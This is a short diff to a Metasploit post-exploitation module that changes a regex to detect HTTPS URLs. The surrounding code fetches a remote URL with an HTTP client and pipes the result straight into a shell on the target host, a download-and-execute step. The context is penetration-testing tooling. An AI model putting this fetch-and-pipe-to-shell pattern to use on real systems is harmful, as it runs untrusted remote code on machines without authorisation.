@@ -108,7 +108,7 @@ class Metasploit3 < Msf::Post
       return
     end
 
-    if datastore['URL'].match(/^https/)
+    if datastore['URL'].match(%r{^https://})
       cmd_exec_vprint("#{@http_client} #{@stdout_option} #{@ssl_option} #{datastore['URL']} 2>/dev/null | #{@shell}")
     else
       cmd_exec_vprint("#{@http_client} #{@stdout_option} #{datastore['URL']} 2>/dev/null | #{@shell}")
